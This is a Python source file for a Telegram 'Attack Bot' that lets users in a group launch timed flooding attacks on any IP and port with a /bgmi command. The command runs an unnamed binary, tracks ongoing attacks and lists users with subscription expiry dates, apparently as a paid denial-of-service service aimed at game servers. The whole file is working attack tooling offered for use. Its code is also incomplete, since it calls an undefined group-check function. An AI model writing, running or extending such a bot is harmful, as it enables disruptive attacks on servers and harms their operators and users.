import logging
import subprocess
import datetime
import itertools
import requests
import atexit
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS



# Global variables
user_processes = {}
MAX_DURATION = 300  # Max attack duration in seconds

# Ensure commands are executed in the correct group
import atexit

def start_attack(target_ip, port, duration, user_id):
    command = ['./xxxx', target_ip, str(port), str(duration)]
    try:
        process = subprocess.Popen(command)
        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port
        }

        # Register cleanup for when the script exits
        def cleanup():
            if process.poll() is None:  # Check if the process is still running
                process.terminate()
                process.wait()

        atexit.register(cleanup)

        # Wait for the attack to finish
        process.wait()

        # After the attack finishes, remove the process from the dictionary
        del user_processes[user_id]
        logging.info(f"Attack finished on {target_ip}:{port} by user {user_id}")
    except Exception as e:
        logging.error(f"Error starting attack: {str(e)}")


# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 Welcome to the Attack Bot!\nUse /bgmi <IP> <PORT> <DURATION> to start an attack.")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    
    user_id = update.message.from_user.id

    # Check if the user already has an ongoing attack
    if user_id in user_processes:
        await update.message.reply_text("🚫 An attack is already in progress. Please wait for the current attack to finish before starting a new one.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Port and duration must be integers.")
        return

    # Enforce maximum duration of 300 seconds
    if duration > MAX_DURATION:
        await update.message.reply_text(f"⚠️ Maximum attack duration is {MAX_DURATION} seconds. The duration has been set to {MAX_DURATION} seconds.")
        duration = MAX_DURATION

    # Inform the user that the attack is starting
    await update.message.reply_text(f"🚀 Attack started on {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.")
    
    # Start the attack in a separate thread
    threading.Thread(target=start_attack, args=(target_ip, port, duration, user_id), daemon=True).start()

# View attacks command
async def view_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    if not user_processes:
        await update.message.reply_text("📊 No ongoing attacks.")
        return
    attack_details = "\n".join([f"User: {user_id}, Target: {details['target_ip']}:{details['port']}"
                                 for user_id, details in user_processes.items()])
    await update.message.reply_text(f"📊 Ongoing attacks:\n{attack_details}")

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    help_text = """
ℹ️ **Help Menu**:
- /start - Start the bot
- /bgmi <IP> <PORT> <DURATION> - Start a new attack
- /view_attacks - View ongoing attacks
- /help - Display this help message
"""
    await update.message.reply_text(help_text)

# All users command (Admin-only)
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    # Example user data (replace with actual user data logic)
    users = {"123456789": "2024-12-31", "987654321": "2025-01-31"}
    user_list = "\n".join([f"User ID: {uid}, Expiry: {exp}" for uid, exp in users.items()])
    await update.message.reply_text(f"👥 Authorized users:\n{user_list}")

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("view_attacks", view_attacks))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("allusers", allusers))
    app.run_polling()
